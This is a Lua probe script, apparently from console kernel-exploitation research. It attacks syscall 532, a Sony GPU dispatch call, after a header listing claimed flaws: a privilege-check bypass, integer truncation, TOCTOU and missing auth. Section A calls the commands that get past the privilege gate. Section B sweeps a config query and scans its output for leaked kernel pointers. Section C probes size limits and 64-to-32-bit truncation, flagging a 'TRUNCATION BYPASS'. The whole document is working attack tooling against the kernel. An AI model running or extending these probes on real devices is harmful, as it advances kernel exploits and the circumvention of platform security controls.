-- CRASH_CLASS: MODERATE
-- PROBE 97a: sys 532 unprivileged GPU dispatch commands
--
-- Context: Deep handler analysis (sys_532_deep.md) reveals sys 532 is the primary
-- Sony GPU/compute multi-command dispatch with ~70+ sub-ops. When priv_check(0x2aa)
-- FAILS, 9 commands bypass the gate:
--   0x18-0x1F (range check [cmd-0x18] < 7 = cmds 0x18-0x1E)
--   0x20 (config query, fixed 0x30 copyin)
--   0x2F (additional bypass)
--
-- 7 identified vulnerabilities including:
--   V1: Integer truncation on size (QWORD → DWORD in some paths)
--   V2: TOCTOU in handle validation (no locking during multi-step decode)
--   V5: Missing auth on deinit path
--
-- Handler: 5 args: cmd(dword), subcmd(dword), output_ptr(qword), input_ptr(qword), size(qword)
-- Copyin sizes: default max 0x801, cmds 0x1A-0x1D allow 0x819
-- Stack frame: 0x858 bytes, local buffer 0x818
--
-- Section A: Enumerate all 9 unprivileged commands with minimal args
-- Section B: cmd 0x20 config query (0x30 copyin, potential info leak)
-- Section C: cmds 0x1A-0x1D with various input sizes (integer truncation test)

local TEST_SECTION = TEST_SECTION or "A"

print("=== PROBE 97a: GPU DISPATCH UNPRIVILEGED ===")
print("Section: " .. TEST_SECTION)
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function fmt(val)
    local h, l = get_hi_lo(val)
    if h == 0 then return string.format("0x%X", l) end
    return string.format("0x%X%08X", h, l)
end

local sc532 = make_syscall(532)
local sc624 = make_syscall(624)  -- baseline
local sc20  = make_syscall(20)   -- getpid

-- sys 532 args: cmd(arg0), subcmd(arg1), output_ptr(arg2), input_ptr(arg3), size(arg4)

if TEST_SECTION == "A" then
    print("--- Section A: Enumerate unprivileged commands ---")
    print("  Commands 0x18-0x1E, 0x20, 0x2F bypass priv_check(0x2aa)")
    print("")

    local outbuf = memory.alloc(0x1000)  -- output buffer
    local inbuf = memory.alloc(0x1000)   -- input buffer (zeroed)

    -- Zero both buffers
    for i = 0, 0x3FF do
        safe_wd(outbuf + i * 4, 0)
        safe_wd(inbuf + i * 4, 0)
    end

    -- Test all unprivileged commands
    local cmds = {0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F, 0x20, 0x2F}

    for _, cmd in ipairs(cmds) do
        -- Reset output buffer sentinel
        safe_wd(outbuf, 0xDEADDEAD)
        safe_wd(outbuf + 4, 0xDEADDEAD)

        -- Try with subcmd=0, zero input, small size
        local ok, rv = pcall(function()
            return sc532(uint64(cmd), uint64(0), uint64(outbuf), uint64(inbuf), uint64(0x18))
        end)
        local ret = ok and to_num(rv) or -999
        local out0 = safe_rd(outbuf) or 0
        local out1 = safe_rd(outbuf + 4) or 0

        -- Check if output was modified
        local modified = (out0 ~= 0xDEADDEAD) or (out1 ~= 0xDEADDEAD)

        if ok then
            print(string.format("  cmd=0x%02X subcmd=0 size=0x18: ret=0x%X out[0]=0x%08X out[4]=0x%08X%s",
                cmd, ret, out0, out1,
                modified and " *** OUTPUT MODIFIED ***" or ""))
        else
            print(string.format("  cmd=0x%02X subcmd=0 size=0x18: PCALL-FAIL", cmd))
        end

        -- Also try with subcmd=1 for commands that might dispatch on it
        safe_wd(outbuf, 0xDEADDEAD)
        ok, rv = pcall(function()
            return sc532(uint64(cmd), uint64(1), uint64(outbuf), uint64(inbuf), uint64(0x18))
        end)
        ret = ok and to_num(rv) or -999
        out0 = safe_rd(outbuf) or 0
        if ok and ret ~= 0x800D0218 then  -- skip "not found" errors
            print(string.format("           subcmd=1: ret=0x%X out[0]=0x%08X", ret, out0))
        end
    end
    print("")

    -- Test a privileged command to confirm it's blocked
    print("[A2] Privileged command 0x00 (should fail):")
    local ok, rv = pcall(function()
        return sc532(uint64(0), uint64(0), uint64(outbuf), uint64(inbuf), uint64(4))
    end)
    print("  ret=" .. (ok and fmt(rv) or "PCALL-FAIL"))
    print("")

    print("[A3] Stability check:")
    ok, rv = pcall(function() return sc624() end)
    print("  sys 624=" .. (ok and fmt(rv) or "FAIL"))

    print("")
    print("[DONE] Section A complete")

elseif TEST_SECTION == "B" then
    print("--- Section B: cmd 0x20 config query ---")
    print("  Fixed 0x30 copyin, potential info/config leak")
    print("")

    local outbuf = memory.alloc(0x1000)
    local inbuf = memory.alloc(0x100)

    -- cmd 0x20 with various subcmds
    print("[B1] cmd 0x20 with subcmd sweep 0-15:")
    for subcmd = 0, 15 do
        -- Clear output
        for i = 0, 0x1F do safe_wd(outbuf + i * 4, 0xDEAD0000 + i) end
        -- Clear input and set size field
        for i = 0, 0xF do safe_wd(inbuf + i * 4, 0) end

        local ok, rv = pcall(function()
            return sc532(uint64(0x20), uint64(subcmd), uint64(outbuf), uint64(inbuf), uint64(0x30))
        end)
        local ret = ok and to_num(rv) or -999

        if ok and ret == 0 then
            -- Dump first 0x30 bytes of output
            print(string.format("  subcmd=%d: ret=0 *** SUCCESS ***", subcmd))
            local line = "    out: "
            for i = 0, 11 do
                local v = safe_rd(outbuf + i * 4) or 0
                line = line .. string.format("%08X ", v)
                if i == 7 then
                    print(line)
                    line = "         "
                end
            end
            print(line)

            -- Check for kernel pointers in output
            for i = 0, 5 do
                local val = safe_rq(outbuf + i * 8)
                if val then
                    local h, l = get_hi_lo(val)
                    if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then
                        print(string.format("    *** KERNEL POINTER at +0x%02X: %s ***",
                            i * 8, fmt(val)))
                    end
                end
            end
        else
            if ret ~= -999 then
                print(string.format("  subcmd=%d: ret=0x%X", subcmd, ret))
            else
                print(string.format("  subcmd=%d: PCALL-FAIL", subcmd))
            end
        end
    end
    print("")

    -- Try with input data containing specific patterns
    print("[B2] cmd 0x20 with input pattern (query type in first DWORD):")
    local query_types = {0, 1, 2, 3, 0xFF, 0x100, 0x1000}
    for _, qt in ipairs(query_types) do
        for i = 0, 0x1F do safe_wd(outbuf + i * 4, 0) end
        for i = 0, 0xF do safe_wd(inbuf + i * 4, 0) end
        safe_wd(inbuf, qt)

        local ok, rv = pcall(function()
            return sc532(uint64(0x20), uint64(0), uint64(outbuf), uint64(inbuf), uint64(0x30))
        end)
        local ret = ok and to_num(rv) or -999
        local out0 = safe_rd(outbuf) or 0
        local out4 = safe_rd(outbuf + 4) or 0

        if ok then
            print(string.format("  input[0]=0x%X: ret=0x%X out=0x%08X 0x%08X",
                qt, ret, out0, out4))
        end
    end

    print("")
    print("[DONE] Section B complete")

elseif TEST_SECTION == "C" then
    print("--- Section C: cmds 0x1A-0x1D size handling ---")
    print("  These allow max 0x819 bytes copyin (vs normal 0x801)")
    print("  Testing integer truncation: QWORD size → DWORD in some paths")
    print("")

    local outbuf = memory.alloc(0x1000)
    local inbuf = memory.alloc(0x1000)
    for i = 0, 0x3FF do
        safe_wd(inbuf + i * 4, 0x43434343)  -- pattern
    end

    -- Test normal sizes first
    print("[C1] cmds 0x1A-0x1D with normal sizes:")
    for cmd = 0x1A, 0x1D do
        for i = 0, 0x1F do safe_wd(outbuf + i * 4, 0) end

        local ok, rv = pcall(function()
            return sc532(uint64(cmd), uint64(0), uint64(outbuf), uint64(inbuf), uint64(0x18))
        end)
        local ret = ok and to_num(rv) or -999
        print(string.format("  cmd=0x%02X size=0x18: ret=0x%X", cmd, ret))
    end
    print("")

    -- Test boundary sizes
    print("[C2] Size boundary tests on cmd 0x1A:")
    local test_sizes = {
        0x800,       -- just under normal limit
        0x801,       -- normal limit
        0x818,       -- just under extended limit
        0x819,       -- extended limit for 0x1A-0x1D
        0x81A,       -- over limit (should reject)
        0x1000,      -- way over
    }
    for _, sz in ipairs(test_sizes) do
        for i = 0, 0x1F do safe_wd(outbuf + i * 4, 0) end
        local ok, rv = pcall(function()
            return sc532(uint64(0x1A), uint64(0), uint64(outbuf), uint64(inbuf), uint64(sz))
        end)
        local ret = ok and to_num(rv) or -999
        print(string.format("  size=0x%X: ret=0x%X%s", sz, ret,
            ret == 0 and " *** ACCEPTED ***" or ""))
    end
    print("")

    -- Test integer truncation: size = 0x100000018 (truncates to 0x18 as DWORD)
    print("[C3] Integer truncation test on cmd 0x1A:")
    local trunc_sizes = {
        {0x1, 0x00000018},  -- 0x100000018 → truncates to 0x18
        {0x1, 0x00000800},  -- 0x100000800 → truncates to 0x800
        {0x1, 0x00000001},  -- 0x100000001 → truncates to 0x1
    }
    for _, pair in ipairs(trunc_sizes) do
        for i = 0, 0x1F do safe_wd(outbuf + i * 4, 0) end
        local sz_val = uint64(string.format("0x%X%08X", pair[1], pair[2]))
        local ok, rv = pcall(function()
            return sc532(uint64(0x1A), uint64(0), uint64(outbuf), uint64(inbuf), sz_val)
        end)
        local ret = ok and to_num(rv) or -999
        print(string.format("  size=0x%X%08X: ret=0x%X%s", pair[1], pair[2], ret,
            ret == 0 and " *** TRUNCATION BYPASS ***" or ""))
    end
    print("")

    -- Stability
    print("[C4] Stability check:")
    local ok, rv = pcall(function() return sc624() end)
    print("  sys 624=" .. (ok and fmt(rv) or "FAIL"))

    print("")
    print("[DONE] Section C complete")
end

print("")
print("=== PROBE 97a COMPLETE ===")
